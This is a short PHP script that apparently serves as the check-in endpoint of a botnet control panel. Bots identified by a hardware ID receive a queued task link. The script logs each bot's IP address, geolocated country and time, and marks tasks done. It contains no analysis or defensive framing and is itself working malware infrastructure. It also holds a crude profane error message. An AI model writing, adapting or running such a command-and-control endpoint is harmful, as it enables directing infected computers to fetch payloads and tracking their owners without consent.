<?php
error_reporting(0);
include("config.php");

	 $hwid = mysqli_real_escape_string($condb,$_GET['hwid']);
	 $completed = $_GET['completed'];



	 if(isset($hwid)){

            if (!preg_match("/^[-a-zA-Z-0-9]*$/",$hwid)) {
                            
                echo  "Go Fuck yourself :v ";
                
                // exit();
                
            }else{

                //echo  "allowed :)";
                $sql = "SELECT * FROM `tasks` where HWID='$hwid' AND completed=0";
                $query_std = mysqli_query($condb,$sql);
                
                $d = date('Y/m/d h:i:s a', time());
                $row_sub=mysqli_fetch_array($query_std);
                echo  $row_sub['link'];
				
                $loc = json_decode(file_get_contents('http://ip-api.com/json/'.$_SERVER['REMOTE_ADDR']), true);
			    $c = $loc['countryCode'];
				mysqli_query($condb,"UPDATE `bot` SET `Date_Time`='$d', `Country`='$c' ,`IP`='".$_SERVER['REMOTE_ADDR']."' WHERE `HWID`='$hwid'"); 

        }

     }
     
     if(isset($hwid) && isset($completed)){

                    if (!preg_match("/^[-a-zA-Z-0-9]*$/",$hwid)) {
                                        
                        echo  "Go Fuck yourself :v ";
                        
                        // exit();
                        
                    }else{

                        //echo  "allowed :)";
                    $sql = "UPDATE `tasks` SET `completed`=1 WHERE `HWID`='$hwid'";
                    $query_ok = mysqli_query($condb,$sql);

                }
	 }
     

?>